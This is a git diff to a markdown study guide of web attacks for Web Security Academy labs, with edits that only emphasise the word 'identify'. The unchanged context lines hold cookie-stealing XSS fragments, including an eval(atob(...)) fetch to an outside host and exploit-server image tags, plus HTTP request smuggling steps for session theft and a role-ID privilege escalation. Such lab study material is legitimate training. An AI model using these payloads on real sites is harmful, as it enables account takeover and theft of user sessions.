@@ -186,7 +186,7 @@ document.cookie = "TopSecret=UnSafeCookieSessionValueForTopSecretCookie";
   
 ### XSS Tags & Events  
 
->This section give guide to identify reflected XSS in a **search** function on a target and how to determine the HTML tags and events attributes not blocked.  
+>This section give guide to ***identify*** reflected XSS in a **search** function on a target and how to determine the HTML tags and events attributes not blocked.  
   
 >The tag **Body** and event **onresize** is the only allowed, providing an injection to perform XSS.  
 
@@ -326,7 +326,7 @@ https://TARGET.web-security-academy.net/?SearchTerm="+eval(atob("fetch("https://
   
 ### Stored XSS
 
->Use following sample code to identify stored XSS, if stored input is redirecting victim that click or following the links to our exploit server.  
+>Use following sample code to ***identify*** stored XSS, if stored input is redirecting victim that click or following the links to our exploit server.  
 
 ```HTML
 <img src="https://EXPLOIT.net/img">
@@ -535,7 +535,7 @@ csrf=ValidCSRFCookieValue&postId=8&name=c&email=c%40c.c&website=&comment=c
 
 ### CL.TE multiCase - User-Agent Cookie Stealer
 
->Identify the UserAgent value is stored in the GET request loading the blog comment form, and stored in **User-Agent** hidden value. Exploiting HTTP request smuggling to deliver reflected XSS using **User-Agent** value that is then placed in a smuggled request.  
+>***Identify*** the UserAgent value is stored in the GET request loading the blog comment form, and stored in **User-Agent** hidden value. Exploiting HTTP request smuggling to deliver reflected XSS using **User-Agent** value that is then placed in a smuggled request.  
 
 >Basic Cross Site Scripting Payload escaping out of HTML document.  
 
@@ -637,7 +637,7 @@ x=1
 
 >Target is vulnerable to request smuggling because the front-end server **downgrades HTTP/2** requests and fails to adequately sanitize incoming headers. Exploitation is by use of an HTTP/2-exclusive request smuggling vector to steal a victims session cookie and gain access to user's account.  
 
->Identify possible vulnerability when Target reflect previous and recent search history based on cookie, by removing cookie it is noticed that your search history is reset, confirming that it's tied to your session cookie.  
+>***Identify*** possible vulnerability when Target reflect previous and recent search history based on cookie, by removing cookie it is noticed that your search history is reset, confirming that it's tied to your session cookie.  
 
 ![recent-searchs](images/recent-searchs.png)  
 
@@ -684,7 +684,7 @@ Host: 0abf00a503615fccc3301f8f008000fe.web-security-academy.net\r\n
 \r\n
 ```  
 
->Note: Paths in both POST and GET requests points to a non-existent endpoint. This help to identify when not getting a 404 response, it is from victim user stolen request captured.  
+>Note: Paths in both POST and GET requests points to a non-existent endpoint. This help to ***identify*** when not getting a 404 response, it is from victim user stolen request captured.  
 >Note: Remember to terminate the smuggled request properly by including the sequence ```\r\n\r\n``` after the Host header.  
 
 ![302 Response once stolen admin cookie request captured](images/302-stolen-admin-cookie.png)  
@@ -732,7 +732,7 @@ Connection: close
 
 ![Intruder Payload set to identify Admin role ID](images/intruder-payload-positions.png)  
 
->Attack identify the possible role ID of administrator access role and then send this request with updated roleId to privile escalate the current logged in user to role of administator of target.  
+>Attacker ***identify*** the possible role ID of administrator role and then send this request with updated roleId to privilege escalate the current logged in user to the access role of administator.  
 
 ![Attack identify Admin role ID](images/admin-roleid-privesc.png)  
 
